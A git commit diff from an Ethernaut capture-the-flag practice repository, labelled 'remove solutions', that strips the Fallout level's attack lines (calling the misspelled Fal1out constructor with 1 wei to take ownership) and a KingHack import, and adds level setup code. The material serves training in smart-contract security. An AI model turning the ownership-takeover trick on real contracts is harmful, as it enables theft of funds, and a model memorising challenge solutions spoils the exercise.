897eca3ded9b017a9d16685d781939a4f593625a
Andy <fei.andy.li@gmail.com>
2022-08-23 17:15:56 +0800

    remove solutions

--- src/test/Fallout.t.sol
+++ src/test/Fallout.t.sol
@@ -22,14 +22,16 @@ contract FalloutTest is DSTest {
         // LEVEL SETUP //
         /////////////////
 
+        FalloutFactory falloutFactory = new FalloutFactory();
+        ethernaut.registerLevel(falloutFactory);
+        vm.startPrank(eoaAddress);
+        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
+        Fallout ethernautFallout = Fallout(payable(levelAddress));
+
         //////////////////
         // LEVEL ATTACK //
         //////////////////
 
-        // Call Fal1out constructor function with some value, mispelling enables us to call it - log owner before and after  
-        emit log_named_address("Fallout Owner Before Attack", ethernautFallout.owner());
-        ethernautFallout.Fal1out{value: 1 wei}();
-        emit log_named_address("Fallout Owner After Attack", ethernautFallout.owner());
 
         //////////////////////
         // LEVEL SUBMISSION //
--- src/test/King.t.sol
+++ src/test/King.t.sol
@@ -1,7 +1,6 @@
 pragma solidity ^0.8.10;
 
 import "ds-test/test.sol";
-import "../King/KingHack.sol";
 import "../King/KingFactory.sol";
 import "../Ethernaut.sol";
 import "./utils/vm.sol";
